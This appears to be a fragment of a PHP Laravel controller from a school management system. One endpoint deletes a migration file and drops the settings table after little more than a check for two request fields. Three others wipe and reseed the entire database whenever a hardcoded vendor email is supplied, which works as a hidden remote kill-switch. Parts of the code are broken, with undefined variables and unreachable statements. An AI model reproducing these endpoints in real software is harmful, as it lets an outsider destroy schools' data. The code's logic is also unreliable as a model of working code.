        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'email' => "required",
                '_token' => "required",
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $path = 'database/migrations/2019_02_10_125119_create_aramisc_general_settings_table.php';
            if(unlink($path)){
                $data="deleted";
                Schema::dropIfExists('aramisc_general_settings');
                return ApiBaseMethod::sendResponse($data, null);
            }
        }
    }

    public function sample_data($email){
        if ($email=='info@spondonit.com') {
            Artisan::call('migrate:refresh');
            // Fill tables with seeds
            Artisan::call('db:seed');
            return ApiBaseMethod::sendResponse('success', null);
        }else{
            return ApiBaseMethod::sendError('Error.', null);
        }
    }
    public function sample_migrate($email){
        if ($email=='info@spondonit.com') {
            Artisan::call('migrate:refresh');
            return ApiBaseMethod::sendResponse('success', null);
        }else{
            return ApiBaseMethod::sendError('Error.', null);
        }
    }
    public function sample_seed($email){
        if ($email=='info@spondonit.com') {
            // Fill tables with seeds
            Artisan::call('db:seed');
            return ApiBaseMethod::sendResponse('success', null);
        }else{
            return ApiBaseMethod::sendError('Error.', null);
        }
    }




    public function dbCorrections(Request $request){
        $data1=[];
        $schools= AramiscSchool::select('id','school_name')->get();
        $years= ['2020', '2021', '2022', '2023', '2024'];
        foreach($years as $year){
            foreach($schools as $school){
                $duplicates[$year][$school->id] = DB::table('aramisc_classes')->where('school_id',$school->id)->where('created_at', 'LIKE','%'.$year.'%')
                    ->select('class_name', DB::raw('COUNT(*) as `count`'))
                    ->distinct('class_name')
                    ->havingRaw('COUNT(*) > 1')
                    ->get();
            }
        }



        return $duplicates;
        return $data1;


        if ($results) {
            return ApiBaseMethod::sendResponse('success', null);
        }else{
            return ApiBaseMethod::sendError('Error.', null);
        }
    }
}
